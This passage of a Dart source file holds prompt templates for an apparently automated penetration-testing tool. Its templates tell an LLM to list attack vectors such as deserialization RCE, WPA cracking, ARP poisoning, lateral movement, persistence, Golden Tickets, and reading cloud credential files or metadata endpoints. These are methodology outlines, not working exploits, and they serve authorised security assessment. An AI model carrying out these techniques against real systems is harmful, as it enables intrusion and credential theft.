Evidence: Jenkins/TeamCity/GitLab CI with accessible artifact repositories; writable package registry endpoints
Severity: CRITICAL — malicious code in production builds

### SBOM/Manifest Secrets Exposure
Attacker objective: recover internal registry URLs, authentication tokens, and internal dependency names from package manifest files exposed via directory listing or predictable paths.
Files to check: package-lock.json, yarn.lock, requirements.txt, Gemfile.lock, pom.xml, build.gradle, composer.lock
Evidence: web server with directory listing enabled; common manifest file paths returning HTTP 200; any of the above files visible in recon data
Severity: MEDIUM to HIGH depending on content — registry auth tokens are HIGH; internal package names are MEDIUM (enable dependency confusion)

### Typosquatting Internal Packages
Attacker objective: exploit typos in package names to install attacker-controlled packages.
Mechanism: similar to dependency confusion but exploiting common typos (e.g., reqeusts vs requests) rather than namespace confusion.
Evidence: same as dependency confusion — internal package names discoverable
Severity: HIGH

## RULES:
- Only generate findings when package registry or source code indicators are present
- Include guidance on enumerating internal package names without triggering the attack
- CONFIDENCE FLOOR: findings without direct registry/manifest evidence must be LOW confidence
- attackVector: NETWORK for registry access; LOCAL for dependency confusion (affects developer machines)

''';

  // ---------------------------------------------------------------------------
  // Phase 9 — Thick Client and Binary Protocol Prompt
  // ---------------------------------------------------------------------------

  static String thickClientBinaryProtocolPrompt(String deviceJson) => '''
You are an expert penetration tester specializing in thick client applications, Java middleware, and binary protocol exploitation. Analyze the device data below and identify attack vectors against non-HTTP binary protocols and enterprise middleware.

## DEVICE DATA:
$deviceJson

## SCOPE — thick client and binary protocol attacks:

### Java RMI / IIOP Unauthenticated Deserialization
Attacker objective: achieve remote code execution by exploiting unauthenticated Java RMI registries that allow arbitrary object deserialization.
Mechanism: any class on the classpath can be instantiated via RMI; JMX with no authentication allows arbitrary MBean invocation including script execution.
Evidence: port 1099 (RMI registry), 7199/7000 (JMX), or RMI/IIOP banner present
Severity: CRITICAL — unauthenticated RCE via deserialization

### Java Deserialization on Enterprise Middleware
Attacker objective: achieve RCE by sending a malicious serialized Java object to a middleware endpoint that deserializes it without validation.
Platforms affected:
- WebLogic T3/IIOP protocol (ports 7001/7002): T3 protocol deserializes objects before authentication
- JBoss/WildFly HTTP invoker (port 8080/9990): HTTP-based Java deserialization endpoint
- Java serialization magic bytes (AC ED 00 05) in any traffic: indicates Java serialization in use
Evidence: WebLogic, JBoss, WildFly, or GlassFish service detected; Java serialization magic bytes in responses
Severity: CRITICAL

### ActiveMQ / RabbitMQ / Kafka Unauthenticated Access
Attacker objective: read/inject messages in the message broker, or exploit ClassInfo deserialization on ActiveMQ.
Evidence:
- ActiveMQ management console (port 8161) accessible without authentication
- RabbitMQ management UI (port 15672) with default credentials (guest/guest)
- Kafka broker (port 9092) accessible without SASL authentication
Severity: HIGH for message read/inject; CRITICAL for ActiveMQ deserialization RCE

### Custom Binary Protocol Analysis
Attacker objective: identify vulnerabilities in custom TCP binary protocols by analyzing the protocol framing and testing field boundaries.
Testing approach:
- Identify protocol framing: length-prefixed, delimiter-based, or TLV (type-length-value)
- Test string fields for command injection by injecting shell metacharacters
- Test length fields for integer overflow by submitting values near INT_MAX
- Test for unauthenticated command execution by sending commands without authentication headers
Evidence: non-standard high-numbered ports open without known service identification; custom service banners
Severity: CRITICAL if command execution is achievable; HIGH for authentication bypass

### AMF (Action Message Format) Deserialization
Attacker objective: exploit AMF deserialization vulnerabilities in Flash/Flex application backends.
Evidence: AMF content type in responses, port 2080, Flex/Flash technology indicators, BlazeDS or LCDS server indicators
Severity: CRITICAL — AMF deserialization has a long history of critical vulnerabilities

## RULES:
- Only generate findings for ports and services present in the device data
- CONFIDENCE FLOOR: findings without direct port/service evidence must be LOW confidence
- attackVector: NETWORK for all findings
- Each attack class is a SEPARATE finding

''';

  // ---------------------------------------------------------------------------
  // Phase 8 — Wireless Assessment Prompt
  // ---------------------------------------------------------------------------

  static String wirelessSecurityPrompt(String deviceJson) => '''
You are an expert wireless security penetration tester. Analyze the device data below and identify wireless attack vectors against the identified access points and wireless infrastructure.

## DEVICE DATA:
$deviceJson

## SCOPE — wireless attack classes:

### WPA2-PSK Offline Cracking
Attacker objective: recover the pre-shared key by capturing a 4-way handshake and running an offline dictionary/rule-based attack.
Technique: deauthenticate a connected client to force a reconnect, capture the 4-way handshake, crack offline using wordlists and rules targeting common enterprise password patterns.
Evidence: wireless AP with WPA2-PSK identified
Severity: HIGH — full network access once PSK is recovered

### PMKID Attack (No Client Required)
Attacker objective: extract the PMKID from a single beacon frame without requiring a connected client, enabling offline cracking without waiting for a handshake.
Technique: request the PMKID directly from the AP — it is derivable from the PMK, BSSID, and client MAC, and is crackable offline.
Evidence: any WPA2 wireless AP present
Severity: HIGH — enables offline cracking without client interaction

### WPA Enterprise PEAP/MSCHAPv2 Credential Harvest
Attacker objective: capture domain credentials from clients that auto-connect to a rogue AP with the same SSID.
Technique: stand up a rogue AP with the same SSID and a self-signed certificate; clients connecting automatically send MSCHAPv2 challenge-response pairs which are offline-crackable to recover the NT hash.
Evidence: WPA2-Enterprise / 802.1X wireless identified
Severity: CRITICAL — yields domain credentials for every auto-connecting client; NT hash enables Pass-the-Hash without cracking
OPSEC: requires physical proximity; clients may warn about certificate change

### Evil Twin / Deauthentication Attack
Attacker objective: force clients to connect to an attacker-controlled AP by deauthenticating them from the legitimate AP.
Technique: send 802.11 deauthentication frames (unauthenticated in WPA2) to disconnect clients, then serve a rogue AP with the same SSID to capture credentials or traffic.
Evidence: any wireless AP present
Severity: HIGH — enables credential capture and traffic interception
OPSEC: deauth attacks are noisy and detectable by WIDS; 802.11w (Management Frame Protection) mitigates deauth attacks

### WPS PIN Brute Force
Attacker objective: recover the WPA2 PSK by brute-forcing the 8-digit WPS PIN, which is split into two independently verifiable halves (effectively ~11,000 combinations).
Technique: use a WPS PIN attack tool to systematically test PIN combinations; the AP's WPS response reveals whether the first half is correct, halving the search space.
Evidence: WPS identified as enabled on the AP
Severity: HIGH — recovers the full PSK regardless of complexity

### Wireless Management Interface Default Credentials
Attacker objective: gain administrative access to the AP management interface using factory default credentials.
Evidence: AP management interface accessible (port 80/443/8443); device model identifiable from banner or hostname
Severity: HIGH — full AP configuration access; enables rogue SSID creation, traffic capture, firmware replacement

## RULES:
- Only generate findings when wireless AP indicators are present in the device data
- Each attack class is a SEPARATE finding
- Include OPSEC notes for attacks that are noisy or require proximity
- attackVector: ADJACENT for all wireless findings (requires physical proximity)

''';

  // ---------------------------------------------------------------------------
  // Phase 7 — Network Infrastructure Attack Prompt
  // ---------------------------------------------------------------------------

  static String networkInfrastructureAttackPrompt(String deviceJson) => '''
You are an expert network penetration tester specializing in layer-2 and layer-3 network attacks. Analyze the device data below and identify network infrastructure attack vectors.

## DEVICE DATA:
$deviceJson

## SCOPE — network infrastructure attacks (internal targets only):

### VLAN Hopping via 802.1Q Double-Tagging
Attacker objective: send frames to a VLAN the attacker is not authorized to access by crafting frames with two 802.1Q VLAN tags.
Mechanism: the switch strips the outer tag (matching the attacker's native VLAN) and forwards the frame to the inner tag's VLAN. The attack only works one-way (attacker → target VLAN) but enables sending traffic to otherwise segmented hosts.
Evidence: switch or router infrastructure identified (switch management ports, CDP/LLDP indicators, network device hostnames); segmented network topology indicated
Severity: HIGH — bypasses network segmentation controls

### ARP Poisoning / Man-in-the-Middle
Attacker objective: intercept all traffic between two hosts by poisoning their ARP caches with the attacker's MAC address.
Mechanism: send gratuitous ARP replies claiming to be the gateway or target host — all traffic routes through the attacker, enabling credential capture and session hijacking.
Evidence: internal network access confirmed; any Windows or Linux hosts present (ARP is universal)
Severity: CRITICAL — full traffic interception including cleartext credentials

### STP Root Bridge Manipulation
Attacker objective: become the spanning tree root bridge by sending superior BPDU frames, forcing all network traffic to flow through attacker-controlled infrastructure.
Mechanism: craft BPDUs with a lower bridge priority than the current root — switches elect the attacker as root and redirect traffic accordingly.
Evidence: Cisco or other managed switch infrastructure identified; CDP/LLDP data present; layer-2 network access
Severity: HIGH — network-wide traffic interception

### IPv6 Rogue Router Advertisement
Attacker objective: become the default IPv6 gateway for all hosts on the segment by sending ICMPv6 Router Advertisement messages.
Mechanism: broadcast RA messages claiming to be the IPv6 router — all modern OSes (Windows, Linux, macOS) prefer IPv6 and will route IPv6 traffic through the attacker. Effective even when IPv6 is "not in use" since hosts still process RAs.
Evidence: any internal network with Windows or Linux hosts (IPv6 enabled by default on all modern OSes)
Severity: HIGH — passive traffic interception for all IPv6 traffic; effective on virtually all modern internal networks

### BGP/OSPF Route Injection
Attacker objective: inject malicious routes into the routing infrastructure to redirect traffic or cause denial of service.
Mechanism: if routing protocol management interfaces are accessible without authentication, inject routes that redirect traffic through attacker-controlled paths.
Evidence: router/switch management ports open (Telnet/23, SSH/22); routing protocol ports (OSPF/89, BGP/179, EIGRP/88); network device hostnames (sw-, rtr-, core-, dist-)
Severity: CRITICAL — network-wide traffic redirection

## RULES:
- Only generate findings for internal targets — these attacks require LAN segment access
- CONFIDENCE FLOOR: findings without direct infrastructure evidence must be LOW confidence
- attackVector: ADJACENT for all findings (requires LAN access)
- Each attack class is a SEPARATE finding

''';

  // ---------------------------------------------------------------------------
  // Phase 5 — Post-Exploitation: Lateral Movement, Persistence, Domain Dominance
  // ---------------------------------------------------------------------------

  static String lateralMovementPrompt(String deviceJson, String accessType) => '''
You are an expert penetration tester conducting post-exploitation lateral movement analysis. Based on the confirmed access type and device data, identify lateral movement paths to other hosts and higher-value targets.

## DEVICE DATA:
$deviceJson

## CONFIRMED ACCESS TYPE: $accessType

## LATERAL MOVEMENT TECHNIQUES BY ACCESS TYPE:

### Linux Shell Access
- SSH key reuse: enumerate ~/.ssh/known_hosts and authorized_keys on all accessible home directories — keys often grant access to other hosts without passwords
- Credential files in home directories: .bash_history, .netrc, application config files with embedded passwords
- Internal service discovery from the compromised host: ARP cache, /etc/hosts, routing table, DNS resolver cache reveal internal network topology
- Sudo misconfiguration lateral move: if sudo allows running commands as another user (not just root), pivot to that user's context
- Application service accounts: web server, database, and application service accounts often have access to other internal services

### Windows Shell Access
- Pass-the-Hash via CrackMapExec/Impacket: use captured NTLM hashes to authenticate to SMB on other Windows hosts
- WMI remote execution: with any valid credential, execute commands on remote Windows hosts via WMI over DCOM (port 135)
- WinRM/PowerShell Remoting: with any valid credential, establish interactive PowerShell sessions on hosts with WinRM enabled (ports 5985/5986)
- SMB lateral move: use obtained credentials to access shares on other hosts, deploy payloads via writable shares
- Scheduled task creation on remote hosts: with admin access, create scheduled tasks on remote hosts for code execution
- Token impersonation: impersonate higher-privilege tokens present in the current process list

### Domain Credentials Available
- Remote execution across all domain-joined hosts: test obtained domain credentials against all discovered hosts via SMB, WinRM, WMI
- Domain enumeration from foothold: enumerate all domain computers, identify high-value targets (DCs, file servers, exchange servers)
- Targeting domain controllers specifically: DCs are the ultimate lateral movement target — access yields DCSync capability
- Kerberoasting from foothold: with any domain credential, request TGS tickets for all SPNs and crack offline
- BloodHound data collection: run domain enumeration from the foothold to map all attack paths to Domain Admin

### Pivoting and Tunneling
- SSH -D SOCKS proxy: establish a SOCKS proxy through the compromised host to route tool traffic through it
- SSH -L/-R port forwarding: forward specific ports to reach services behind the compromised host
- Chisel/ligolo tunnel: establish a full tunnel for routing arbitrary traffic through the pivot
- Proxychains configuration: configure proxychains to route all tool traffic through the established tunnel
- Internal network topology discovery from pivot: ARP cache, routing table, /etc/hosts, internal DNS queries

## RULES:
- Only generate findings relevant to the confirmed access type
- Each lateral movement path is a SEPARATE finding
- attackVector: ADJACENT (requires network access from the compromised host)
- privilegesRequired: LOW (assumes initial shell access)

''';

  static String persistencePrompt(String deviceJson, String accessType) => '''
You are an expert penetration tester documenting persistence mechanisms. Based on the confirmed access type, identify where persistence COULD be established — document as findings showing persistence capability without implementing backdoors.

## DEVICE DATA:
$deviceJson

## CONFIRMED ACCESS TYPE: $accessType

## PERSISTENCE MECHANISMS BY OS:

### Linux Persistence
- Cron jobs: user crontab or /etc/cron.d/ entries — execute attacker payload on schedule
- Systemd service installation: create a .service unit file in /etc/systemd/system/ — survives reboots
- SSH authorized_keys injection: add attacker public key to ~/.ssh/authorized_keys — passwordless SSH access
- .bashrc/.profile modification: append commands to shell initialization files — executes on every login
- SUID binary creation: create a SUID copy of bash or a custom binary — privilege escalation on demand
- Web shell in web application root: drop a PHP/JSP/ASPX shell in the web root — HTTP-accessible backdoor
OPSEC notes: cron jobs generate /var/log/syslog entries; systemd services appear in journalctl; SSH key additions are logged

### Windows Persistence
- Scheduled task via schtasks: create a task running at logon or on a schedule — survives reboots
- Service installation via sc: install a service that runs at startup as SYSTEM
- Registry Run keys: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run — executes at user logon
- WMI subscription persistence: event filter + consumer + binding — fileless, difficult to detect
- DLL hijacking in writable directories: place a malicious DLL in a directory searched before the legitimate one
- Startup folder: drop a shortcut or script in the user or all-users startup folder
OPSEC notes: scheduled tasks logged in Security event log (4698); service installation logged (7045); WMI subscriptions are stealthy but detectable via WMI repository inspection

### Domain-Level Persistence
- GPO modification: add a startup script or scheduled task via Group Policy — executes on all domain computers
- AdminSDHolder manipulation: modify ACLs on AdminSDHolder object — propagates to all protected accounts hourly
- ACL backdoor (WriteDACL/WriteOwner on domain object): grant a low-privilege account DCSync rights
- Golden Ticket creation: with krbtgt hash, forge TGTs valid for 10 years — survives password resets
- ADCS certificate-based persistence: enroll an enrollment agent certificate — issue certificates for any account indefinitely
OPSEC notes: GPO changes logged in DC event log; AdminSDHolder changes detectable via ACL monitoring; Golden Tickets detectable via anomalous TGT lifetimes

## RULES:
- Document persistence paths as findings — do NOT recommend implementing backdoors
- Each persistence mechanism is a SEPARATE finding
- attackVector: LOCAL (requires existing shell access)
- Include OPSEC notes in the description for each technique

''';

  static String domainDominancePrompt(String deviceJson) => '''
You are an expert Active Directory penetration tester. Domain Admin access has been confirmed. Identify post-Domain-Admin actions that demonstrate the full scope of compromise and establish persistence.

## DEVICE DATA:
$deviceJson

## POST-DOMAIN-ADMIN TECHNIQUES:

### DCSync — Full Domain Hash Extraction
Attacker objective: extract NTLM hashes for every domain account including krbtgt, enabling offline cracking and Golden Ticket creation.
Technique: simulate a DC replication request using any tool that implements the MS-DRSR protocol — the DC responds with all password hashes.
Impact: complete credential compromise of the entire domain; enables Pass-the-Hash for every account.
Severity: CRITICAL

### Golden Ticket Creation and Persistence
Attacker objective: forge Kerberos TGTs that are valid for any account, any service, for up to 10 years — survives all password resets except krbtgt password rotation (which must be done twice).
Technique: extract the krbtgt NTLM hash via DCSync, then forge TGTs offline using the krbtgt hash as the signing key.
Impact: indefinite domain access that cannot be revoked by password changes alone.
Severity: CRITICAL

### Silver Ticket Creation
Attacker objective: forge Kerberos service tickets for specific services without contacting the KDC — bypasses DC logging for those service accesses.
Technique: with the service account's NTLM hash, forge TGS tickets for that specific service.
Impact: stealthy access to specific services; useful for accessing SQL Server, file shares, or web services without KDC interaction.
Severity: HIGH

### Forest Trust Enumeration and Cross-Forest Attacks
Attacker objective: identify and exploit trust relationships to compromise other Active Directory forests.
Technique: enumerate all forest trusts; if a two-way trust exists, domain admin in one forest may enable access to the other.
Impact: compromise of trusted forests; lateral movement beyond the initial domain.
Severity: CRITICAL if exploitable trusts exist

### ADCS Certificate-Based Persistence
Attacker objective: obtain a certificate that can be used to authenticate as any domain user indefinitely.
Technique: enroll an enrollment agent certificate from ADCS; use it to issue certificates for any account including Domain Admins.
Impact: authentication persistence that survives password resets — certificates remain valid until expiry or explicit revocation.
Severity: CRITICAL

### Domain Controller Persistence
- Skeleton Key injection: patch the LSASS process on the DC to accept a master password for any account (non-persistent, lost on reboot)
- DSRM password reset: set the Directory Services Restore Mode password to a known value — provides local admin access to the DC even when the domain is unavailable
- DC shadow: register a rogue DC to replicate malicious changes to the real DC
Severity: CRITICAL for all DC persistence mechanisms

## RULES:
- Generate findings for each technique as a documentation of compromise scope
- Each technique is a SEPARATE finding
- attackVector: NETWORK (domain admin can execute these remotely)
- privilegesRequired: HIGH (requires Domain Admin)

''';

  // ---------------------------------------------------------------------------
  // Phase 3 — Cloud Scope Distinction Prompts
  // ---------------------------------------------------------------------------

  static String cloudExposedResourcesPrompt(String deviceJson) => '''
You are an expert cloud security penetration tester. Analyze the device data below and identify externally accessible cloud resource misconfigurations — storage, registries, and credential files accessible without authentication from the internet.

## DEVICE DATA:
$deviceJson

## SCOPE — externally exposed cloud resources:

### Public Cloud Storage Buckets
- AWS S3 buckets with public ListBucket or GetObject access — enumerate bucket contents, read sensitive files
- Azure Blob Storage containers with public access level set to Container or Blob
- GCP Cloud Storage buckets with allUsers or allAuthenticatedUsers IAM bindings
Evidence: cloud storage subdomain patterns in CNAME/DNS records, storage URLs in response bodies, cloud provider indicators
Severity: CRITICAL if writable; HIGH if readable with sensitive data

### Public Container Registry Access
- ECR (AWS), GCR (GCP), ACR (Azure), Docker Hub private-made-public registries
- Unauthenticated catalog endpoint: GET /v2/_catalog returns all image names
- Images may contain embedded secrets, hardcoded credentials, or base images with known CVEs
Evidence: registry domain patterns in DNS/CNAME, port 5000 open, registry API paths in recon
Severity: HIGH

### Exposed Cloud Credential Files at Common Paths
- /.aws/credentials — AWS access key and secret
- /.azure/ — Azure service principal credentials
- /.config/gcloud/ — GCP service account key
- /kubeconfig, /.kube/config, /kubeconfig.yaml — Kubernetes cluster credentials
Evidence: web application present, cloud provider indicators in device data
Severity: CRITICAL — cloud credentials yield account-wide API access

### Cloud Storage Subdomain Takeover
- Dangling CNAME pointing to an S3 bucket or Azure Blob endpoint that is unregistered
- Attacker registers the bucket/container name and serves malicious content under the organization's domain
Evidence: CNAME records pointing to s3.amazonaws.com, blob.core.windows.net, or storage.googleapis.com subdomains
Severity: HIGH

## RULES:
- Only generate findings when cloud indicators are present in the device data
- CONFIDENCE FLOOR: findings without direct cloud evidence must be LOW confidence
- attackVector: NETWORK for all findings

''';

  static String cloudInfrastructureMisconfigPrompt(String deviceJson) => '''
You are an expert cloud infrastructure security assessor. Analyze the device data below and identify cloud infrastructure misconfigurations beyond storage — serverless functions, Kubernetes RBAC, security groups, and metadata endpoint exposure.

## DEVICE DATA:
$deviceJson

## SCOPE — cloud infrastructure misconfigurations:

### Serverless Function Exposed URLs Without Authentication
- Lambda function URLs (.lambda-url., .on.aws), Azure Function URLs (.azurewebsites.net), GCP Cloud Function URLs (.cloudfunctions.net) accessible without authentication
- Any caller can invoke the function — if the function has backend DB or cloud API access, impact is CRITICAL
Evidence: function URL patterns in recon, serverless platform indicators
Severity: HIGH to CRITICAL

### Kubernetes RBAC Misconfiguration
- Service accounts with cluster-admin role binding
- Wildcard resource access (resources: ["*"], verbs: ["*"])
- Anonymous API access to /api/v1/pods or /api/v1/secrets
Evidence: Kubernetes API port 6443 open, K8s indicators in device data
Severity: CRITICAL for anonymous access; HIGH for over-permissive RBAC

### AWS Security Group Overpermission
- 0.0.0.0/0 ingress on sensitive ports: 22 (SSH), 3389 (RDP), 1433 (MSSQL), 3306 (MySQL)
- Any management port open to the entire internet
Evidence: cloud provider indicators, sensitive ports open on internet-facing host
Severity: HIGH — direct internet exposure of management services

### Cloud Metadata Endpoint Exposure via SSRF
- Instance metadata service reachable from within the target environment via SSRF
- AWS IMDSv1 (169.254.169.254) accessible without token — yields IAM role credentials
- GCP metadata (metadata.google.internal) accessible — yields service account tokens
- Azure IMDS (169.254.169.254 with Metadata: true header) — yields managed identity tokens
Evidence: SSRF-capable parameters in web application, cloud hosting indicators
Severity: CRITICAL

### Instance Profile Credential Abuse
- IAM role attached to the instance has permissions beyond the instance's stated purpose
- Compromising the instance yields cloud account capabilities far exceeding the application scope
Evidence: cloud provider indicators, any SSRF or RCE surface present
Severity: HIGH to CRITICAL depending on role permissions

## RULES:
- Only generate findings when cloud indicators are present in the device data
- CONFIDENCE FLOOR: findings without direct cloud evidence must be LOW confidence
- attackVector: NETWORK for all findings

''';

  // ---------------------------------------------------------------------------
  // Phase 2 — Business Logic Deep-Dive Prompt
  // ---------------------------------------------------------------------------

  static String businessLogicDeepDivePrompt(String deviceJson) => '''
You are an expert web application penetration tester specializing in business logic vulnerabilities. Analyze the device data below and identify business logic attack surfaces that require understanding the application's intended workflow.

## DEVICE DATA:
$deviceJson

## SCOPE — business logic attack classes:

### Price and Value Manipulation
Attacker objective: obtain goods, services, or credits at unintended prices by manipulating numeric fields the server trusts.
- Negative quantity inputs: submit qty=-1 in cart/order requests — some backends subtract rather than validate, crediting the attacker's account
- Integer overflow in monetary fields: submit values near INT_MAX or INT64_MAX — overflow wraps to negative, crediting the account
- Floating-point precision abuse: submit prices like 0.001 in financial calculations — rounding errors accumulate to attacker's benefit
- Currency conversion race conditions: initiate a transaction in one currency, exploit the window between rate fetch and application to get a favorable rate
- Coupon/discount stacking: apply multiple single-use coupons in parallel requests; apply a coupon after it has been marked used via race condition
Evidence: any e-commerce, subscription, credits, or financial functionality visible in recon data

### Workflow and State Machine Bypass
Attacker objective: skip required steps in a multi-step process to reach a privileged state without completing prerequisites.
- Direct access to step N without completing step N-1: if workflow state is tracked by a session variable or URL parameter, navigate directly to later steps
- Parameter manipulation to set step=complete: modify hidden form fields or request parameters that indicate workflow progress
- Skipping payment step in checkout flows: after adding items to cart, attempt to access order confirmation endpoint directly
- Accessing post-auth pages with a partial (pre-MFA) session: after first factor, attempt to access protected resources before MFA is completed
Evidence: multi-step forms, checkout flows, registration wizards, approval workflows visible in recon

### Account Enumeration via Observable Differences
Attacker objective: determine which usernames/emails are registered by observing differences in application responses.
- Username enumeration via response time: valid usernames trigger password hash comparison (slow); invalid usernames return immediately (fast)
- Error message content differences: "incorrect password" vs "user not found" — different messages confirm account existence
- HTTP status code differences: 200 vs 404, or different redirect destinations for valid vs invalid accounts
- Registration endpoint: "email already in use" vs successful registration confirms account existence
Evidence: login form, registration form, password reset endpoint visible in recon

### Password Reset Logic Flaws
Attacker objective: take over any account by exploiting weaknesses in the password reset flow.
- Host header injection into reset email: if the application uses the Host header to construct the reset link URL, inject an attacker-controlled domain — the victim clicks a link that sends the token to the attacker
- Token reuse: attempt to use the same reset token twice — if accepted, tokens are not invalidated after use
- Expired token still accepted: request a token, wait past its stated expiry, attempt to use it
- Token not invalidated after password change: after resetting the password, attempt to use the original token again
- Weak entropy in token generation: short numeric tokens (6-digit OTP style) are brute-forceable if no rate limiting exists
Evidence: password reset functionality visible in recon data

### Order-of-Operations Abuse
Attacker objective: exploit the sequence of operations to apply benefits before qualifying for them.
- Applying a discount after adding items: test whether discount codes can be applied after the order total is calculated
- Applying loyalty rewards before qualifying purchase: attempt to redeem rewards before the triggering purchase completes
- Manipulating cart totals via hidden form fields: if cart total is submitted as a form field rather than calculated server-side, modify it
- Concurrent requests to exploit race conditions in order processing: submit multiple simultaneous purchase requests for a limited-quantity item
Evidence: shopping cart, loyalty program, discount/coupon functionality visible in recon

### Account Takeover via Feature Abuse
Attacker objective: take over another user's account by abusing legitimate application features.
- Merging accounts with identical email: if the application allows account merging, create an account with a victim's email and trigger a merge
- Forced browsing to account verification endpoints: attempt to use another user's verification token by guessing or enumerating token values
- OAuth account linking without re-authentication: link an attacker-controlled OAuth identity to a victim's account without requiring the victim's password
Evidence: account management, OAuth/social login, email verification functionality visible in recon

## CONFIDENCE GUIDANCE:
Most business logic findings will be MEDIUM confidence from recon — the attack surface is confirmed (the feature exists) but live testing is required to confirm exploitability. Only rate HIGH confidence if a specific misconfiguration indicator is observed (e.g., cart total in a form field, step parameter in URL).

## RULES:
- Only generate findings when the relevant application feature is observable in recon data
- Infer application purpose from URL paths, page titles, form field names, and response content
- Each attack class is a SEPARATE entry
- Do NOT generate findings for features that have no evidence in the recon data

''';
}
